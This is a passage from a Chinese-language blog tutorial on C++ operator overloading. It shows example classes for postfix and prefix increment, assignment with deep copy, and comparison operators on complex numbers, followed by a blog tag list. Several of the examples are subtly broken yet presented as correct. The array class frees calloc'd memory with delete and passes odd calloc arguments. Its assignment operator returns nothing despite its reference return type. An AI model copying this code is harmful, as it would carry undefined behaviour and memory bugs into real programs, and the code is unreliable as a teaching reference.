​ 在这种情况下，为了防止使用时可能出现的错误，我们可以将返回值用const修饰，通过返回右值避免多重后置递增导致的结果错误，如果使用了多重递增，那么编译时就会报错。 ​ 这里有两个注意点： ​ ① 重载整形强转，这个是在遇到复杂的类的时候对强转操作进行一些自定义防止出错，这里就一个参数所以加不加没差。 ​ ② 对左移运算符重载的修改，把形参里对类对象的引用传递改为值传递，因为后置递增返回的是临时变量的值，而前置返回的是引用，所以这里用值传递可以支持两种运算，用引用则会报错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class MyInteger{ public: MyInteger(int i=0):num(i){ //构造 } // 前置++ MyInteger&amp; operator++(){ num++; return *this; } // 后置++ const MyInteger operator++(int){ MyInteger tmp = *this; num++; return tmp; } operator int const() { return num; } int num;};ostream&amp; operator&lt;&lt;(ostream &amp;out,MyInteger mi){ cout&lt;&lt;mi.num; return out;}int main(){ MyInteger mi(5); cout&lt;&lt; mi++ &lt;&lt;endl; cout&lt;&lt;mi&lt;&lt;endl; cout&lt;&lt;++mi&lt;&lt;endl; cout&lt;&lt;mi&lt;&lt;endl; return 0;} ​ 结果： ¶4、赋值 ​ 直接上代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;class MyArr{public: MyArr(int l):len(l){ //构造 arr = (int *)calloc(this-&gt;len,len*sizeof(int)); } ~MyArr(){ //析构 if(this-&gt;arr!=NULL){ delete this-&gt;arr; this-&gt;arr = NULL; } } MyArr(const MyArr &amp; src){ //拷贝构造:深拷贝 this-&gt;len = src.len; this-&gt;arr = (int *)calloc(this-&gt;len,len*sizeof(int)); memcpy(this-&gt;arr,src.arr,len*sizeof(int)); } int operator[](int i) const { return arr[i]; } //读取，作为右值 int&amp; operator[](int i){ return arr[i]; } //写入，作为左值 MyArr &amp; operator=(const MyArr &amp; src){ //重载赋值运算符 if(this!=&amp;src){ this-&gt;len = src.len; delete this-&gt;arr; this-&gt;arr = NULL; this-&gt;arr = (int *)calloc(this-&gt;len,len*sizeof(int)); memcpy(this-&gt;arr,src.arr,len*sizeof(int)); } } int len; int* arr;};ostream&amp; operator&lt;&lt;(ostream &amp;out,MyArr ma){ cout&lt;&lt;&quot;length: &quot;&lt;&lt;ma.len&lt;&lt;endl; cout&lt;&lt;&quot;data: &quot;&lt;&lt;endl; for(int i=0;i&lt;ma.len;i++){ cout&lt;&lt;ma[i]&lt;&lt;&quot; &quot;; } return out;}int main(){ MyArr ma(5); for(int i=0;i&lt;ma.len;i++){ ma[i] = i+1; } MyArr ma2(ma); for(int i=0;i&lt;ma.len;i++){ ma2[i] += i+1; } cout&lt;&lt;ma&lt;&lt;endl; cout&lt;&lt;ma2&lt;&lt;endl; return 0;} ​ 结果： ​ 可见，赋值运算符的重载的实现和深拷贝操作异曲同工。 ¶5、关系运算符 ​ 大于、小于、等于、小于等于、大于等于 ​ 这里判断逻辑我简单写一下，主要是演示重载操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Complex{public: double real; double imag; Complex(double r = 0.0,double i = 0.0){ real = r; imag = i; } Complex operator+(const Complex&amp; adder); Complex operator-(const Complex&amp; suber); bool operator&lt;(const Complex&amp; c); bool operator&gt;(const Complex&amp; c); bool operator==(const Complex&amp; c); bool operator&lt;=(const Complex&amp; c); bool operator&gt;=(const Complex&amp; c);};Complex Complex::operator+(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real + adder.real; tmp.imag = this-&gt;imag + adder.imag; return tmp;}Complex Complex::operator-(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real - adder.real; tmp.imag = this-&gt;imag - adder.imag; return tmp;}bool Complex::operator&lt;(const Complex&amp; c){ double left = this-&gt;real*this-&gt;real+this-&gt;imag*this-&gt;imag; double right = c.real*c.real+c.imag*c.imag; if(left&lt;right){ return true; }else{ return false; }}bool Complex::operator&gt;(const Complex&amp; c){ double left = this-&gt;real*this-&gt;real+this-&gt;imag*this-&gt;imag; double right = c.real*c.real+c.imag*c.imag; if(left&gt;right){ return true; }else{ return false; }}bool Complex::operator==(const Complex&amp; c){ if((this-&gt;real == c.real) &amp;&amp; (this-&gt;imag == c.imag)){ return true; }else{ return false; }}bool Complex::operator&lt;=(const Complex&amp; c){ double left = this-&gt;real*this-&gt;real+this-&gt;imag*this-&gt;imag; double right = c.real*c.real+c.imag*c.imag; if(left&lt;=right){ return true; }else{ return false; }}bool Complex::operator&gt;=(const Complex&amp; c){ double left = this-&gt;real*this-&gt;real+this-&gt;imag*this-&gt;imag; double right = c.real*c.real+c.imag*c.imag; if(left&gt;=right){ return true; }else{ return false; }}ostream&amp; operator&lt;&lt;(ostream &amp;out,Complex &amp;c){ if(c.imag&lt;0){ cout&lt;&lt;&quot;c = &quot;&lt;&lt;c.real &lt;&lt; &quot;-&quot;&lt;&lt;-c.imag&lt;&lt;&quot;i&quot;; }else cout&lt;&lt;&quot;c = &quot;&lt;&lt;c.real &lt;&lt; &quot;+&quot;&lt;&lt;c.imag&lt;&lt;&quot;i&quot;; return out;}int main(){ Complex c1(20,20); Complex c2(5,5); Complex c3(5,5); if(c1&gt;c2){ cout&lt;&lt;&quot;大&quot;&lt;&lt;endl; } if(c3==c2){ cout&lt;&lt;&quot;等于&quot;&lt;&lt;endl; } if(c2&lt;c1){ cout&lt;&lt;&quot;小&quot;&lt;&lt;endl; } return 0;} ​ 结果： ¶总结 ​ 运算符重载在C++编程中可用的场景非常多，编程语言的学习其实语法只是一小部分，关键是懂得学以致用，用合适的方法实现自己的需求。","link":"/2022/09/15/C++%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"提权","slug":"提权","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"C++&#x2F;面向对象","slug":"C-面向对象","link":"/tags/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"}],"categories":[]}